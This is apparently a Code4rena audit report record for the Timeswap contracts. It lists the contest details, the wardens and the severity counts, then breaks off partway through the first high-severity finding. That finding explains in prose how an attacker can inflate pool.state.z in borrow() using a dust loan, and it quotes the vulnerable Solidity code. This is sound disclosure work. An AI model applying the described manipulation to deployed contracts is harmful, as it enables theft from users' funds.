{
  "circa": {
    "title": "Timeswap contest",
    "sponsor": "Timeswap",
    "slug": "2022-01-timeswap",
    "date": "2022-03-03",
    "findings": "https://github.com/code-423n4/2022-01-timeswap-findings/issues",
    "contest": 74
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 code contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the code contest outlined in this document, C4 conducted an analysis of Timeswap contest smart contract system written in Solidity. The code contest took place between January 4—January 10 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>35 Wardens contributed reports to the Timeswap contest:</p>\n<ol>\n<li>jayjonah8</li>\n<li>WatchPug (<a href=\"https://github.com/jack-the-pug\">jtp</a> and <a href=\"https://github.com/mingwatch\">ming</a>)</li>\n<li><a href=\"https://twitter.com/SirH4shalot\">sirhashalot</a></li>\n<li>hyh</li>\n<li><a href=\"https://twitter.com/danbinnun\">danb</a></li>\n<li>egjlmn1</li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>0x1f8b</li>\n<li><a href=\"https://twitter.com/rhynorater\">Rhynorater</a></li>\n<li>harleythedog</li>\n<li><a href=\"https://twitter.com/DylanPokun\">Dravee</a></li>\n<li>thank_you</li>\n<li><a href=\"https://twitter.com/fitraldys\">Fitraldys</a></li>\n<li><a href=\"https://twitter.com/_ye0lde\">ye0lde</a></li>\n<li>robee</li>\n<li><a href=\"https://twitter.com/meidhiwirara\">Tomio</a></li>\n<li>certora</li>\n<li><a href=\"https://twitter.com/defsec_\">defsec</a></li>\n<li>p4st13r4 (0xb4bb4 and <a href=\"https://github.com/0x69e8\">0x69e8</a>)</li>\n<li><a href=\"https://www.instagram.com/riyan_rfa/\">rfa</a></li>\n<li><a href=\"https://twitter.com/ori_dabush\">OriDabush</a></li>\n<li>Jujic</li>\n<li><a href=\"https://twitter.com/cmichelio\">cmichel</a></li>\n<li><a href=\"https://twitter.com/jah_s3\">jah</a></li>\n<li><a href=\"https://twitter.com/merkleplant_eth\">pmerkleplant</a></li>\n<li><a href=\"https://twitter.com/gzeon\">gzeon</a></li>\n<li><a href=\"https://twitter.com/Meta0xNull\">Meta0xNull</a></li>\n<li>bitbopper</li>\n<li>PPrieditis</li>\n<li>0x0x0x</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>fatima_naz</li>\n<li>cccz</li>\n</ol>\n<p>This contest was judged by <a href=\"https://github.com/0xean\">0xean</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/CloudEllie1\">CloudEllie</a> and <a href=\"https://twitter.com/itsmetechjay\">itsmetechjay</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 33 unique vulnerabilities and 87 total findings. All of the issues presented here are linked back to their original finding.</p>\n<p>Of these vulnerabilities, 7 received a risk rating in the category of HIGH severity, 10 received a risk rating in the category of MEDIUM severity, and 16 received a risk rating in the category of LOW severity.</p>\n<p>C4 analysis also identified 11 non-critical recommendations and 43 gas optimizations.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-01-timeswap\">C4 Timeswap contest repository</a>, and is composed of 7 smart contracts written in the Solidity programming language and includes 1325 source lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code423n4.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-7\" style=\"position:relative;\"><a href=\"#high-risk-findings-7\" aria-label=\"high risk findings 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (7)</h1>\n<h2 id=\"h-01-timeswappairsolborrow-improper-implementation-allows-attacker-to-increase-poolstatez-to-a-large-value\" style=\"position:relative;\"><a href=\"#h-01-timeswappairsolborrow-improper-implementation-allows-attacker-to-increase-poolstatez-to-a-large-value\" aria-label=\"h 01 timeswappairsolborrow improper implementation allows attacker to increase poolstatez to a large value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/162\">[H-01] <code>TimeswapPair.sol#borrow()</code> Improper implementation allows attacker to increase <code>pool.state.z</code> to a large value</a></h2>\n<p><em>Submitted by WatchPug</em></p>\n<p>In the current implementation, <code>borrow()</code> takes a user input value of <code>zIncrease</code>, while the actual collateral asset transferred in is calculated at L319, the state of <code>pool.state.z</code> still increased by the value of the user’s input at L332.</p>\n<p>Even though a large number of <code>zIncrease</code> means that the user needs to add more collateral, the attacker can use a dust amount <code>xDecrease</code> (1 wei for example) so that the total collateral needed is rather small.</p>\n<p>Plus, the attacker can always <code>pay()</code> the dust amount of loan to get back the rather large amount of collateral added.</p>\n<p><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338\">https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">borrow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetTo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dueTo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yIncrease</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lock</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Due</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dueOut</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;E202&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetTo</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">dueTo</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;E201&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetTo</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">dueTo</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;E204&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;E205&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Pool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalLiquidity</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;E206&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">BorrowMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">check</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">, </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">yIncrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">dueOut</span><span class=\"mtk1\">.</span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">BorrowMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">, </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">yIncrease</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">dueOut</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">BorrowMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">, </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">dueOut</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">BlockNumber</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Callback</span><span class=\"mtk1\">.</span><span class=\"mtk11\">borrow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">dueOut</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">dues</span><span class=\"mtk1\">[</span><span class=\"mtk12\">dueTo</span><span class=\"mtk1\">].</span><span class=\"mtk11\">insert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dueOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reserves</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reserves</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">dueOut</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalDebtCreated</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">dueOut</span><span class=\"mtk1\">.</span><span class=\"mtk12\">debt</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">x</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">y</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">yIncrease</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">z</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Sync</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">x</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">y</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">z</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Borrow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assetTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">dueTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">dueOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79\">https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getCollateral</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IPair.State </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">state</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">xDecrease</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zIncrease</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralIn</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateralIn</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_collateralIn</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_collateralIn</span><span class=\"mtk1\"> *= </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_collateralIn</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_collateralIn</span><span class=\"mtk1\">.</span><span class=\"mtk11\">shiftRightUp</span><span class=\"mtk1\">(</span><span class=\"mtk7\">25</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minimum</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">state</span><span class=\"mtk1\">.</span><span class=\"mtk12\">z</span><span class=\"mtk1\">;</span></span></span>\n<span 